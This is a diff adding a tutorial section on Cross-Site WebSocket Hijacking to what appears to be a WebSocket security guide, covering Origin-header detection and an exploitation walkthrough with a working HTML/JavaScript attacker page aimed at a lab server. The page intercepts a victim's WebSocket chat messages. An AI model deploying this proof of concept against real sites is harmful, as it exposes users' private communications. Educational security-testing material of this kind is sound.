@@ -236,3 +236,77 @@ wss.on("connection", (ws) => {
 });
 ```
 
+## 3. WebSockets Vulnerabilities
+### 3.1 Cross-Site WebSocket Hijacking
+This is the top, most discussed bug when it comes to WebSockets, and that's for a clear reason; the great impact it can cause. Testing this bug is easy, and its impact can be devastating, however, in recent years its exploitation became a little harder, as SOP is on all browsers and any well-maintained website nowadays restricts auth cookies with `SameSite`, but, with all this, we still see it emerging in bug reports until today, and that's because only depending on the `SameSite` flag is not the ultimate mitigation. If initial detection tells you that this target is potentially vulnerable to CSWSH, and you have compromised a subdomain of your target, via a subdomain takeover for example, or an XSS on the same domain or a subdomain, then this can be used to perform websocket hijacking, and potentially get read & write access to the vulnerable websocket.
+
+#### 3.1.1 Detection
+While doing your usual testing, you notice an endpoint that performs an upgrade to websocket, the quickest way to test if the websocket is **initially** vulnerable to CSWSH, is to alter the `Origin` header to any random value, or to another subdomain you have taken over, and watch if the response is `101`, if that's the case, then you got a confirmed CSWSH.
+
+<img width="1729" height="469" alt="image" src="https://github.com/user-attachments/assets/ab293cc1-c3e1-4b53-8244-7388894629c7" />
+
+In the above screenshot, the target application performed a websocket upgrade request so that the user's communication between the chat's two parties is done via websocket smoothly, however, altering the `Origin` header didn't trigger the backend to refuse the upgrade, meaning it accepts upgrade requests from any origin, making the ws connection vulnerable to hijacking.
+
+#### 3.1.2 Exploitation
+To exploit the above behavior, and due to the SOP enforced on all modern web browsers, we have to run the exploit from a subdomain of the target we are trying to exploit.
+
+1. Host a web page with JavaSscript code that simply connects to the vulnerable websocket endpoint, and listens for messages
+2. Send the link to the victim, and while the exploitation page is open and the victim is using the websocket, any messages sent or received by the victim are accessed by the attacker
+
+The script in our example is something like:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSWSH Lab - Attacker Page</title>
+</head>
+<body>
+  <h1>CSWSH Test</h1>
+  <pre id="output">Connecting...</pre>
+
+  <script>
+    const output = document.getElementById("output");
+
+    // Your vulnerable lab server
+    const conversationId = "b89bc0b8-f739-4e41-a052-ae56f7754946";
+
+    const ws = new WebSocket(
+      `ws://192.168.100.103:3000/ws/${conversationId}`
+    );
+
+    ws.onopen = () => {
+      output.textContent += "\n[+] WebSocket connected";
+
+      // Test message.
+      ws.send("CSWSH test message");
+    };
+
+    ws.onmessage = (event) => {
+      output.textContent += "\n[+] Received: " + event.data;
+      console.log("[CSWSH] Received:", event.data);
+    };
+
+    ws.onerror = (event) => {
+      output.textContent += "\n[-] WebSocket error";
+      console.log("[CSWSH] Error:", event);
+    };
+
+    ws.onclose = (event) => {
+      output.textContent +=
+        `\n[*] Connection closed (${event.code})`;
+    };
+  </script>
+</body>
+</html>
+```
+
+<img width="2128" height="1067" alt="image" src="https://github.com/user-attachments/assets/f5f14ef8-4627-4705-8fa0-1b7d9ab27704" />
+*Victim is chatting via websocket, while the exploit page is open in another tab*
+
+<img width="2155" height="420" alt="image" src="https://github.com/user-attachments/assets/37042fcb-f55d-4730-b843-c6a1efbcf00d" />
+*Messages are being intercepted in real time*
+
+<img width="2155" height="1107" alt="image" src="https://github.com/user-attachments/assets/4ead5598-5198-478f-b076-386eadbbf790" />
+
+<img width="2155" height="435" alt="image" src="https://github.com/user-attachments/assets/b9f7ed84-243f-4ed1-855a-08199da8e7e9" />
